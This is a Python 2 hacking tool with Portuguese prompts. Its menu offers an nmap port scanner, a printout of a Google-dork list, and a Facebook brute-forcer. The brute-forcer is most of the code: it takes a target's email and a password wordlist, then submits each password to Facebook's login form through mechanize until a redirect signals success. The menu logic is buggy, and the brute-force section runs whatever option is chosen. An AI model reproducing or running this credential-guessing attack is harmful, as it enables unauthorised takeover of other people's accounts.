#!usr/bin/python

import nmap
import sys
import time
import signal
import sys
import random
import mechanize
import cookielib
import pdb
import os

logo =('''                            \ncriado por:
(  ____ \|\     /|/  \ |\     /|   /   )  |\     /|
| (    \/| )   ( |\/) )| )   ( |  / /) |  | )   ( |
  (_____ | (___) |  | || |   | | / (_) (_ | (___) | 
(_____  )|  ___  |  | |( (   ) )(____   _)|  ___  |
        || (   ) |  | | \ \_/ /      ) (  | (   ) |
/\____) || )   ( |__) (_ \   /       | |  | )   ( |
\_______)|/     \|\____/  \_/        (_)  |/     \|\n\n''')
def cls():
                os.system('cls' if os.name == 'nt' else 'clear')
cls()              
print("\nEscreva 'help' para mais informacoes.\n")
print('1 --- Site Scanner\n') 
print('2 --- Dork list\n') 
print('3 --- Facebook Brute-Force\n\n')
#Inicio

try:
                o = (input('Selecione uma das opcoes: '))                
                while o == '':
                                print('\n[-] Porfavor coloque uma das opcoes acima.\n')
                                o = (raw_input('Selecione uma das opcoes: '))
                while o == 'help':
                                print('\nCriado por sh1v4h, atualmente estou aprendendo sobre python e assembly, este e mais um projeto em que consegui terminar com sucesso e quase nenhum problema!!\n')
                                o = (raw_input('Selecione uma das opcoes: '))
                while o == '':
                                print('\n[-] Porfavor coloque uma das opcoes acima.\n')
                                o = (raw_input('Selecione uma das opcoes: '))
                                
                while o == 'help':
                                print('\nCriado por sh1v4h, atualmente estou aprendendo sobre python e assembly, este e mais um projeto em que consegui terminar com sucesso e quase nenhum problema!!\n')
                                o = (raw_input('Selecione uma das opcoes: '))
                while o == '':
                                print('\n[-] Opcao invalida!!\n')
                                o = (raw_input('Selecione uma das opcoes: ')) 
except KeyboardInterrupt:
                print("\n\n----Programa encerrado----\n")  
                sys.exit(0)                                

if o == 1:                
#---Site Scanner
                def cls():
                                os.system('cls' if os.name == 'nt' else 'clear')
                cls()              
                try:                              
                                print "\n-------Site Scanner 1.0-------\n\n"
                                print(logo)
                                N = nmap.PortScanner()
                
                                alvo = str(raw_input("\n----Alvo: "))
                                while alvo == '':
                                                print('\n[-] Porfavor coloque o nome do seu alvo!\n')
                                                alvo = str(raw_input("\n----Alvo: "))
                                while alvo == 'help':
                                                print('\nCriado por sh1v4h, atualmente estou aprendendo sobre python e assembly, este eh mais um projeto em que consegui terminar com sucesso e quase nenhum problema!!\n')
                                                alvo = str(raw_input("\n----Alvo: "))
                                
                                porta = str(raw_input("----Porta: "))
                                
                                while  porta == '':
                                                print("\n[-] Coloque a porta do seu alvo!\n")
                                                porta = str(raw_input("----Porta: "))
                                while porta == 'help':
                                                print('\nCriado por sh1v4h, atualmente estou aprendendo sobre python eh assembly, este e mais um projeto em que consegui terminar com sucesso e quase nenhum problema!!\n')
                                                porta = str(raw_input("----Porta: "))            
                                               
                                
                                print'\n-----Aguarde enquanto a aplicacao escaneia o alvo-----'
                                N.scan(alvo, porta)
                
                                for host in N.all_hosts():      
                    
                                                print "\n[*] Host : %s (%s)" % (host, N[host].hostname())
                                                print "[*] Estado : %s" % N[host].state()
                                                
                                                for proto in N[host].all_protocols():
                                                                
                                                                print "[*] Protocolo : %s" % (proto)
                                                                                
                                                                lport = N[host][proto].keys()
                                                                lport = list(lport)
                                                                lport.sort()    
                                                                for port in lport:
                                                                        
                                                                                print "[*] Porta : %s" % (port)
                                                                                print "[*] Firewall : %s\n" % N[host][proto][port]["state"]
                                                                                sys.exit(1)
                                                                                        
                except IOError:
                                print "\n [*] Error! tente novamente... \n"
                                sys.exit(1)                
                except KeyboardInterrupt:
                                print"\n\n----Programa encerrado----\n"   
                                sys.exit(1)
def cls():
                os.system('cls' if os.name == 'nt' else 'clear')
cls()       
if o == 2:

                def dork():                
                                print'\n-------Dorks list-------\n\n'              
                                os.system('cat dorks.txt' if os.name == 'nt' else 'cat dorks.txt')
                                print"\n\n----Programa encerrado----\n"   
                dork() 
                sys.exit(1)     
#Facebook Brute-force

if o == 3:                                
                print"\n-------Facebook Brute-force 1.0-------\n\n"

try:
                print(logo)                               
                email = str(raw_input("Coloque o email do alvo: "))
                passwordlist = str(raw_input("Coloque o directorio da password_list: "))
                while passwordlist == "":
                                print("\n [*] Error! tente novamente... \n")
                                sys.exit(1)
                
                useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')] 
                login = 'https://www.facebook.com/login.php?login_attempt=1'
except IOError:
                print "\n [*] Error! tente novamente... \n"
                sys.exit(1)                                
except KeyboardInterrupt:
                print("\n\n----Programa encerrado----\n")
                sys.exit(1)
def attack(password):     
                try: 
                                sys.stdout.write("\n[*] Senha: %s..." % password)
                                sys.stdout.flush()
                                br.addheaders = [('User-agent', random.choice(useragents))]
                                site = br.open(login)
                                br.select_form(nr=0)
                
                                
                                br.form['email'] = email
                                br.form['pass'] = password
                                br.submit()
                                log = br.geturl()
                                if (log != login) and (not 'login_attempt' in log):
                                                print '\n[*] Senha encontrada...!! %s' % (password)       
                                                sys.exit(1)
                except IOError:
                                print "\n [*] Error! tente novamente... \n"
                                sys.exit(1)                                                
                                                
                except KeyboardInterrupt:
                                print"\n\n----Programa encerrado----\n"   
def search():
                global password
                for password in passwords:
                                attack(password.replace("\n",""))
def check():                                         
                global br
                global passwords
                try:
                                br = mechanize.Browser()
                                cj = cookielib.LWPCookieJar()
                                br.set_handle_robots(False)
                                br.set_handle_equiv(True)
                                br.set_handle_referer(True)
                                br.set_handle_redirect(True)
                                br.set_cookiejar(cj)
                                br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
                except IOError:
                                print "\n [*] Error! tente novamente... \n"
                                sys.exit(1)                                
                except (KeyboardInterrupt):
                                print"\n\n----Programa encerrado----\n"
                                sys.exit(1)
                try:
                                list = open(passwordlist, "r")
                                passwords = list.readlines()
                                k = 0
                                while k < len(passwords):
                                                passwords[k] = passwords[k].strip()
                                                k += 1
                except IOError:
                                print "\n [*] Error! tente novamente... \n"
                                sys.exit(1)
                except KeyboardInterrupt:
                                print"\n\n----Programa encerrado----\n"
                                sys.exit(1)                           
                try: 
                                print "\n[*] Conta alvo : %s" % (email)
                                print "\n[*] Carregado: " , len(passwords), "senhas"
                                print "\n[*] Atacando, aguarde..."
                except IOError:
                                print "\n [*] Error! tente novamente... \n"
                                sys.exit(1)                                
                except KeyboardInterrupt:
                                print("\n\n----Programa encerrado----\n")
                                sys.exit(1)
                try:
                                search()
                                attack(password)
                except IOError:
                                print "\n [*] Error! tente novamente... \n"
                                sys.exit(1)                                
                except KeyboardInterrupt:
                                print("\n\n----Programa encerrado----\n")
                                sys.exit(1)
if __name__ == '__main__':
                check()
                sys.exit(1)
               
